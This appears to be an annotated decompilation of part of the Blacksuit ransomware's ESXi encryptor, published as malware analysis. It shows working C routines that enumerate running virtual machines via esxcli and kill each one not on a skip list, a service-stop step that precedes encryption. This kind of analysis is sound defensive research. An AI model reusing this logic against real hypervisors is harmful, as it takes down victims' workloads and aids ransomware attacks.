////////////////////////////////////////////////////////////
// Blacksuit Encryptor
// https://www.shadowstackre.com/analysis/blacksuit-ransomware-esxi
// 
// Technique: Mitre Service Stop
// URL: https://attack.mitre.org/techniques/T1489/
//
// Analysis: ShadowStackRE
////////////////////////////////////////////////////////////

// Stop the VM using the 'esxcli' command
void __fastcall stop_vm(const char *vmSkipList)
{
  char shutdownVMProcess[1024]; // [rsp+10h] [rbp-5D0h] BYREF
  char worldID[256]; // [rsp+410h] [rbp-1D0h] BYREF
  struct stat statInfo; // [rsp+510h] [rbp-D0h] BYREF
  __pid_t newPID; // [rsp+5A8h] [rbp-38h]
  int fd; // [rsp+5ACh] [rbp-34h]
  void *fileBuffer; // [rsp+5B0h] [rbp-30h]
  char *haystack; // [rsp+5B8h] [rbp-28h]
  char *newLinePos; // [rsp+5C0h] [rbp-20h]
  int haystackLen; // [rsp+5CCh] [rbp-14h]

  // Create a subprocess
  newPID = fork();
  if ( !newPID )
  {
    // Execute the 'esxcli' command in a child process.
    // The command will get a list of processes related
    // to each running VM machine.  The standard output 
    // of the 'esxcli' is redirected to a new file 'list_'
    execlp("/bin/sh", "/bin/sh", "-c", "esxcli vm process list > list_", 0LL);
    exit(0);
  }
  wait(0LL);
  fd = open("list_", 0);                        // Open the file 'list_'
  if ( fd != -1 )
  {
    memset(&statInfo, 0, sizeof(statInfo));
    stat("list_", &statInfo);                   // Retrieve information about the file 'list_'
    // allocate space for the file buffer which holds the contents of the 'list_' file
    if ( statInfo.st_size && (fileBuffer = malloc(statInfo.st_size)) != 0LL )
    {
      // read the contents of the 'list_' file into the fileBuffer
      if ( (unsigned __int8)read_all(fd, (unsigned __int8 *)fileBuffer, statInfo.st_size) != 1 )
      {
        close(fd);
        free(fileBuffer);
      }
      else
      {
        close(fd);
        haystack = (char *)fileBuffer;          // pointer to the beginning of the fileBuffer
        memset(worldID, 0, sizeof(worldID));
        while ( 1 )
        {
          haystack = strstr(haystack, "World ID: ");// Find the first occurance of 'World ID:' in the fileBuffers content
          if ( !haystack )                      // Exit the loop once the haystack pointer is '\0'
            break;
          haystack += 10;
          newLinePos = strstr(haystack, "\n");  // Find the first occurance of a new line
          haystackLen = (_DWORD)newLinePos - (_DWORD)haystack;
          memset(worldID, 0, sizeof(worldID));
          memcpy(worldID, haystack, haystackLen);
          // Check if the VM Instance should be skipped
          if ( !vmSkipList || !CheckSkipListForWorldID(vmSkipList, haystack) )
          {
            memset(shutdownVMProcess, 0, sizeof(shutdownVMProcess));
            // kill the VM process using the 'esxcli' command and the
            // type 'soft' and the world ID found in the VM process list. 

            // The 'soft' option will allow for a more graceful
            // shutdown to the VM instance.
            sprintf(shutdownVMProcess, "esxcli vm process kill --type=soft --world-id=%s", worldID);
            newPID = fork();                    // Create a new child process
            if ( !newPID )
            {
              // Call the shutdown of the VM process in the child process
              execlp("/bin/sh", "/bin/sh", "-c", shutdownVMProcess, 0LL);
              exit(0);                          // Exit the child process
            }
            wait(0LL);                          // Wait for the child process handling the command to complete
          }
        }
        free(fileBuffer);
      }
    }
    else
    {
      close(fd);                                // Close the file 'list_'
    }
  }
}


// Check if the sample should skip a specific VM based on the skip paramter passed into
// the executable
_BOOL8 __fastcall CheckSkipListForWorldID(const char *vmSkipList, char *vmProcInfo)
{
  _BOOL8 result; // rax
  char displayName[520]; // [rsp+10h] [rbp-230h] BYREF
  char *haystack; // [rsp+218h] [rbp-28h]
  char *newLinePos; // [rsp+220h] [rbp-20h]
  int len; // [rsp+22Ch] [rbp-14h]

  haystack = vmProcInfo;
  memset(displayName, 0, 0x200uLL);
  // Find the first occurance of 'Display Name: ' in the
  // VM Process Information which was the output 
  // from the'esxcli' list process command
  haystack = strstr(vmProcInfo, "Display Name: ");
  result = 0;
  if ( haystack )
  {
    haystack += 14;
    newLinePos = strstr(haystack, "\n");        // Find the first occurance of '\n'
    len = (_DWORD)newLinePos - (_DWORD)haystack;
    memset(displayName, 0, 0x200uLL);
    memcpy(displayName, haystack, len);
    // Find the display name in the list used to skip VMs which have a matching ID.  This name was passed into
    // the program arguments '-skip'
    if ( strstr(vmSkipList, displayName) )
      return 1;
  }
  return result;
}
